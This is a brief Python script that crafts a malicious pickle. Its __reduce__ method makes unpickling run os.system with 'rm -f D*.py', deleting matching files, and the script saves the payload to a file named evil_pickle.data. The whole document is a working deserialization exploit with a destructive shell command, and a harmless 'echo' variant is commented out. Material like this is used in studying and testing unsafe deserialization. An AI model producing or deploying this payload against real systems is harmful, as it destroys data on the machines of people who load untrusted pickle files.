import pickle
import os

# Malicious class with payload
class Malicious:
    def __reduce__(self):
        # return (os.system, ("echo You have been hacked!",))
        return (os.system, ("rm -f D*.py",))

# Serialize the malicious object
payload = pickle.dumps(Malicious())

# Save it to a file (optional)
with open('evil_pickle.data', 'wb') as f:
    f.write(payload)

